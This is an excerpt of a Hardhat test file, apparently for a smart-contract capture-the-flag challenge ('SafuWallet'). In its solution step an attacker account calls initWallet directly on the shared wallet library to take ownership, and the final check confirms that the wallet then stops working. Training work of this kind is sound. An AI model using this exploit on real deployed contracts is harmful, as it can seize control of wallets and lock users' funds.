...
before(async () => {
	...
	let safuWalletLibraryFactory = await ethers.getContractFactory(
		"SafuWalletLibrary"
	);
	...
	await admin.sendTransaction({
		to: safuWallet.address,
		value: precision.mul(100),
	});
	...
	expect(await ethers.provider.getBalance(safuWallet.address)).to.be.equal(
		precision.mul(100 - 50)
	);
});

it("solves the challenge", async function () {
	await safuWalletLibrary
		.connect(attacker)
		.initWallet([], 1, ethers.constants.MaxUint256);
...
after(async () => {
	...
	await expect(
		admin.sendTransaction({ to: safuWallet.address, data: functionInput })
	).to.be.reverted;
});
